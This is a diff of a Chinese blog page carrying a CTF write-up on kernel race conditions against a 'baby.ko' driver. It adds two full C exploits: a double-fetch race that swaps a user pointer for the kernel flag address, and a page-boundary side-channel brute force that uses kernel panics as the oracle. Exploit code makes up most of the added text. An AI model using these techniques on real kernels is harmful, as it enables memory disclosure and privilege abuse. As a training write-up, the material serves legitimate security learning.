@@ -19,13 +19,13 @@
     <meta name="description" content="前言 本篇是关于kernel pwn中的条件竞争，由于是我们在用户态编写程序与内核交互，所以我们可以启动多个线程同时运行，以达到条件竞争 double fetch double fetch可以理解为两次或多次对同一个对象取值 例：内核对一个对象第一次取值进行合法性检测，第二次取值进行使用 我们可以在第一次取值后对值进行修改成恶意数据，在第二次使用时执行我们的恶意数据  通过在 first fetc">
 <meta property="og:type" content="article">
 <meta property="og:title" content="0x07 kernel 条件竞争">
-<meta property="og:url" content="https://nqoinaen.github.io/2022/11/20/0x07kernel%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89/index.html">
+<meta property="og:url" content="https://nqoinaen.github.io/2022/11/21/0x07kernel%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89/index.html">
 <meta property="og:site_name" content="nqoinaen&#39;s blog">
 <meta property="og:description" content="前言 本篇是关于kernel pwn中的条件竞争，由于是我们在用户态编写程序与内核交互，所以我们可以启动多个线程同时运行，以达到条件竞争 double fetch double fetch可以理解为两次或多次对同一个对象取值 例：内核对一个对象第一次取值进行合法性检测，第二次取值进行使用 我们可以在第一次取值后对值进行修改成恶意数据，在第二次使用时执行我们的恶意数据  通过在 first fetc">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://nqoinaen.github.io/img/img5.jpeg">
-<meta property="article:published_time" content="2022-11-20T04:44:03.000Z">
-<meta property="article:modified_time" content="2022-11-21T05:10:03.628Z">
+<meta property="article:published_time" content="2022-11-21T04:44:03.000Z">
+<meta property="article:modified_time" content="2022-11-21T13:27:16.074Z">
 <meta property="article:author" content="nqoinaen">
 <meta property="article:tag" content="kernel 条件竞争">
 <meta name="twitter:card" content="summary_large_image">
@@ -238,8 +238,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2022-11-20 12:44" pubdate>
-          2022年11月20日 下午
+        <time datetime="2022-11-21 12:44" pubdate>
+          2022年11月21日 下午
         </time>
       </span>
     
@@ -250,7 +250,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          2k 字
+          5.2k 字
         
       </span>
     
@@ -261,7 +261,7 @@
         
         
         
-          5 分钟
+          11 分钟
         
       </span>
     
@@ -312,7 +312,7 @@
               <p class="note note-info">
                 
                   
-                    本文最后更新于：2022年11月21日 下午
+                    本文最后更新于：2022年11月21日 晚上
                   
                 
               </p>
@@ -339,7 +339,7 @@
 <p>载入了baby.ko驱动</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">!/bin/sh</span><br><br>mount -t proc none /proc<br>mount -t sysfs none /sys<br>mount -t devtmpfs devtmpfs /dev<br>echo &quot;flag&#123;this_is_a_sample_flag&#125;&quot; &gt; flag<br>chown root:root flag<br>chmod 400 flag<br>exec 0&lt;/dev/console<br>exec 1&gt;/dev/console<br>exec 2&gt;/dev/console<br><br>insmod baby.ko<br>chmod 777 /dev/baby<br>echo -e &quot;\nBoot took $(cut -d&#x27; &#x27; -f1 /proc/uptime) seconds\n&quot;<br>setsid cttyhack setuidgid 1000 sh<br><br>umount /proc<br>umount /sys<br>poweroff -d 0  -f<br></code></pre></td></tr></table></figure>
 <p>baby.ko驱动里只定义了baby_ioctl，里面是这个函数</p>
-<p><img src="/2022/11/20/0x07kernel%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89/1.png" srcset="/img/loading.gif" lazyload alt="1"></p>
+<p><img src="/2022/11/21/0x07kernel%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89/1.png" srcset="/img/loading.gif" lazyload alt="1"></p>
 <p><strong>分析一下它做了啥：</strong></p>
 <p>如果选项0x6666会告诉我们题目给的flag的地址</p>
 <p>如果选项0x1337,一开始会有三个检查</p>
@@ -357,7 +357,20 @@
 <p><strong>第三个检查</strong>判断我们输入的flag_str的len是否等于题目给的flag的长度</p>
 <p>所有检查通过后对逐个字符与题目给的flag进行比较，都比较成功了的话打印题目的flag</p>
 <h4 id="0x02解法1：条件竞争">0x02解法1：条件竞争</h4>
+<p>正常来讲我们用户态是无法使用内核态的指针</p>
+<p>首先0x6666选项得到flag的地址</p>
+<p>接着创建竞争线程，一直重复修改我们与内核交互的.flag_addr指针为内核flag的地址</p>
+<p>原进程则一直通过0x1337选项与内核交互，由于条件竞争，检查通过原本buf在用户态的指针，再次使用该指针时，已经由于我们条件竞争指向了内核态的flag地址，程序就告诉了我们flag</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//gcc get_root.c -static -lpthread -o get_root</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ioctl.h&gt;</span></span><br><br><span class="hljs-type">pthread_t</span> tidp;<br><span class="hljs-type">int</span> competetion_times=<span class="hljs-number">0x10</span>,status=<span class="hljs-number">1</span>;<br><span class="hljs-type">long</span> <span class="hljs-type">long</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> real_addr;<br><span class="hljs-type">char</span> buf[<span class="hljs-number">0x20</span>]=<span class="hljs-string">&quot;will be dropped&quot;</span>;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span>&#123;</span><br>    <span class="hljs-type">char</span> *flag_addr;<br>    <span class="hljs-type">int</span> flag_len;<br>&#125;flag=&#123;.flag_addr=buf,.flag_len=<span class="hljs-number">33</span>&#125;;<br><br><span class="hljs-type">void</span> * <span class="hljs-title function_">competetionThread</span><span class="hljs-params">(<span class="hljs-type">void</span>  *arg)</span><br>&#123;<br>    <span class="hljs-keyword">while</span>(status)<br>    &#123;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;competetion_times;i++);<br>            flag.flag_addr=(<span class="hljs-type">char</span> *)real_addr;<br>    &#125;<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span> <span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> ** argv, <span class="hljs-type">char</span> ** envp)</span><br>&#123;<br>    <span class="hljs-type">int</span> fd,addr_fd,test_fd;<br>    <span class="hljs-type">char</span> * temp,*locate_addr_str;<br>    fd=open(<span class="hljs-string">&quot;/dev/baby&quot;</span>,O_RDWR);<br>    ioctl(fd,<span class="hljs-number">0x6666</span>);<br>    system(<span class="hljs-string">&quot;dmesg|grep flag &gt;addr.txt&quot;</span>);<br>    addr_fd=open(<span class="hljs-string">&quot;./addr.txt&quot;</span>,O_RDONLY);<br>    <span class="hljs-keyword">if</span>(addr_fd&lt;<span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[X]err open addr.txt!\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>    &#125;<br>    temp=(<span class="hljs-type">char</span>*)<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x1000</span>);<br>    temp[read(addr_fd,temp,<span class="hljs-number">0x40</span>)]=<span class="hljs-string">&#x27;\0&#x27;</span>;<br>    locate_addr_str=<span class="hljs-built_in">strstr</span>(temp,<span class="hljs-string">&quot;Your flag is at &quot;</span>)+ <span class="hljs-built_in">strlen</span>(<span class="hljs-string">&quot;Your flag is at &quot;</span>);;<br>    real_addr = strtoull(locate_addr_str,locate_addr_str+<span class="hljs-number">0x10</span>, <span class="hljs-number">16</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;flag_addr=%llx\n&quot;</span>,real_addr);<br><br>    pthread_create(&amp;tidp, <span class="hljs-literal">NULL</span>, competetionThread, <span class="hljs-literal">NULL</span>);<br>    <span class="hljs-keyword">while</span>(status)<br>    &#123;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;competetion_times;i++)<br>        &#123;<br>            flag.flag_addr=buf;<br>            ioctl(fd,<span class="hljs-number">0x1337</span>,&amp;flag);<br>        &#125;<br>        system(<span class="hljs-string">&quot;dmesg|grep flag &gt; result.txt&quot;</span>);<br>        test_fd=open(<span class="hljs-string">&quot;./result.txt&quot;</span>,O_RDONLY);<br>        read(test_fd,temp,<span class="hljs-number">0x1000</span>);<br>        <span class="hljs-keyword">if</span>(<span class="hljs-built_in">strstr</span>(temp,<span class="hljs-string">&quot;flag&#123;&quot;</span>))<br>            status=<span class="hljs-number">0</span>;<br>    &#125;<br>    <br>    pthread_cancel(tidp);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*]successful competetion\n&quot;</span>);<br>    system(<span class="hljs-string">&quot;dmesg|grep flag&quot;</span>);<br><br>&#125;<br><br></code></pre></td></tr></table></figure>
+<p><img src="/2022/11/21/0x07kernel%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89/2.png" srcset="/img/loading.gif" lazyload alt="2"></p>
 <h4 id="0x03解法2：测信道攻击">0x03解法2：测信道攻击</h4>
+<p>由于是 flag 是硬编码的，并且是检查方法是逐字节比较，因此可以逐字节爆破来得到 flag。</p>
+<p>方法是将待爆破的字节放在 mmap 申请的内存页末位，此时下一字节位于不可读写的用户态空间。</p>
+<p>如果我们成功的猜对了一个字节，就会继续往下读，下一字节位于不可读写的用户态空间，读取会导致<code>kernel panic</code>，从而可以判断是否爆破的一个字节正确。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment">|------------------------------|    &lt;---- unallocated page</span><br><span class="hljs-comment">|                              |</span><br><span class="hljs-comment">|							   |</span><br><span class="hljs-comment">|------------------------------|</span><br><span class="hljs-comment">|                              |    &lt;---- page alloc by mmap</span><br><span class="hljs-comment">|                              |</span><br><span class="hljs-comment">|                              |</span><br><span class="hljs-comment">|                              |</span><br><span class="hljs-comment">|                   flag&#123;.....X|</span><br><span class="hljs-comment">|------------------------------|</span><br><span class="hljs-comment">|                              |    &lt;---- unallocated page</span><br><span class="hljs-comment">|                              |</span><br><span class="hljs-comment">|                              |</span><br><span class="hljs-comment">|                              |</span><br><span class="hljs-comment">|------------------------------|</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure>
+<p>这里直接拿arttnba3师傅的脚本，用main的argv[1]来传变量，不用每次编译进行爆破</p>
+<p>关于远端传文件由于本人还没试过，看起来是很麻烦</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//gcc cexindao.c -static -o cexindao</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ioctl.h&gt;</span></span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> </span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">char</span> * flag_addr;<br>    <span class="hljs-type">int</span> flag_len;<br>&#125;flag = &#123; .flag_len = <span class="hljs-number">33</span>&#125;;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> ** argv, <span class="hljs-type">char</span> ** envp)</span><br>&#123;<br>    <span class="hljs-type">int</span> fd, flag_len;<br>    <span class="hljs-type">char</span> * buf, *flag_addr;<br><br>    <span class="hljs-keyword">if</span> (argc &lt; <span class="hljs-number">2</span>)<br>    &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;usage: ./exp flag&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br>    flag_len = <span class="hljs-built_in">strlen</span>(argv[<span class="hljs-number">1</span>]);<br>    <br>    fd = open(<span class="hljs-string">&quot;/dev/baby&quot;</span>, O_RDWR);<br>    buf = (<span class="hljs-type">char</span>*) mmap(<span class="hljs-literal">NULL</span>, <span class="hljs-number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_SHARED, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);<br>    flag_addr = buf + <span class="hljs-number">0x1000</span> - flag_len;<br>    <span class="hljs-built_in">memcpy</span>(flag_addr, argv[<span class="hljs-number">1</span>], flag_len);<br>    flag.flag_addr = flag_addr;<br>    ioctl(fd, <span class="hljs-number">0x1337</span>, &amp;flag);<br>    <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>&#125;<br></code></pre></td></tr></table></figure>
 
                 
               </div>
@@ -404,7 +417,7 @@
   <div class="license-box my-3">
     <div class="license-title">
       <div>0x07 kernel 条件竞争</div>
-      <div>https://nqoinaen.github.io/2022/11/20/0x07kernel条件竞争/</div>
+      <div>https://nqoinaen.github.io/2022/11/21/0x07kernel条件竞争/</div>
     </div>
     <div class="license-meta">
       
@@ -416,7 +429,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>2022年11月20日</div>
+          <div>2022年11月21日</div>
         </div>
       
       
